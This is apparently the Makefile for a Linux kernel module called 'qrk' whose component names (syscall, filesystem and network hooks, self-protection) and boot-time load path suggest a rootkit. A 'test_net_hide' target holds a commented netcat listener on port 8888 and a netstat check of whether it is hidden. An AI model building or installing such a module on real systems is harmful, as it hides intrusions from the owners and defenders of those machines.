obj-m = qrk.o
qrk-objs = qrk_entry.o qrk_hook.o  qrk_common.o qrk_do_hook.o qrk_do_fs_hook.o qrk_self_protect.o qrk_do_net_hook.o
DRIVER=qrk
LINK_DRIVER_DIRECTORY=/lib/modules/$(KERNEL)/kernel/net/$(DRIVER)
# ------------------------------- CONFIG --------------------------------

KERNEL = $(shell uname -r)
PWD = $(shell pwd)
KDIR = /lib/modules/$(KERNEL)/build

DRIVER_DIRECTORY=$(shell readlink -f $(LINK_DRIVER_DIRECTORY))
LOAD_PATH=/etc/modules-load.d/$(DRIVER).conf

# QRK_FLAGS += -DKDEBUG
QRK_FLAGS += -DDRIVER_DIRECTORY=\\\"$(DRIVER_DIRECTORY)\\\"
QRK_FLAGS += -DLOAD_PATH=\\\"$(LOAD_PATH)\\\"

all: linux-x86_64

debug:
	$(MAKE) ARCH=x86_64 EXTRA_CFLAGS="-DFSDEBUG -DKDEBUG -D_CONFIG_X86_64_ ${QRK_FLAGS}" -C $(KDIR) M=$(PWD) modules

linux-x86_64:
	$(MAKE) ARCH=x86_64 EXTRA_CFLAGS="-D_CONFIG_X86_64_ ${QRK_FLAGS}" -C $(KDIR) M=$(PWD) modules
linux-x86:
	$(MAKE) ARCH=x86 EXTRA_CFLAGS="-D_CONFIG_X86_ ${QRK_FLAGS}" -C $(KDIR) M=$(PWD) modules
	
clean: 
	make -C /lib/modules/$(KERNEL)/build M=$(PWD) clean

install:
	sudo ./setup.sh install

uninstall:
	sudo ./setup.sh remove

test:
	cp test.c /tmp
	gcc /tmp/test.c -o /tmp/test
	/tmp/test
	dmesg

test_cmd:
	sudo python3 client.py
	dmesg

test_net_hide:
	# nc -lkp 8888
	netstat -ano | grep 8888
